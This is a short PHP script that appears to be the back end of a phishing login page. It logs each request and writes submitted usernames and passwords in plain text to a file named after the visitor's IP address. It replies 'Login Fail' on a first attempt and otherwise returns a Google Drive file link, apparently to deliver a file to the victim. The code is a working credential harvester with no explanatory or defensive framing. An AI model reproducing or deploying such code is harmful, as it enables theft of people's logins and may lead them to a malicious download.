<?php

error_reporting(E_ALL);
$_config            = array
                    (
                        'language'             => 'language',
                        'username'           => 'username',                        
                        'password'      => 'password',
                        'count'            => 'count'                       
                    );
$_url = $_SERVER['REQUEST_URI'];
$date=date("F j, Y, g:i a");
function write($str)
{	
	$fp = fopen(getenv ("REMOTE_ADDR"), "a+");
	fwrite($fp, $str);
	fwrite($fp, "\r\n");
	fclose($fp);						
}
write("request-url: ". $_url);
if (isset($_POST[$_config['username']]) && isset($_POST[$_config['password']]) && isset($_POST[$_config['count']]))
{    
	$cnt = $_POST[$_config['count']];
    $member_id = $_POST[$_config['username']];
    $password = $_POST[$_config['password']];    
    write($cnt." :\t". "UserID: ".$member_id."\t"."Pass: ".$password."\r\n");
    if(strcmp($cnt, "0") == 0 )
    {
        $str = "Login Fail";
        header("Content-Type: text/plain");
        header("Content-Length: ".strlen($str));
        echo($str);
    }else
    {
        $str = "https://drive.google.com/file/d/1ra7zb3K4BPF3qjJ-lNdWs_qQQeeR4z38/view?usp=sharing";
        header("Content-Type: text/plain");
        header("Content-Length: ".strlen($str));
        echo($str);
        
    }                                                                            
}
?>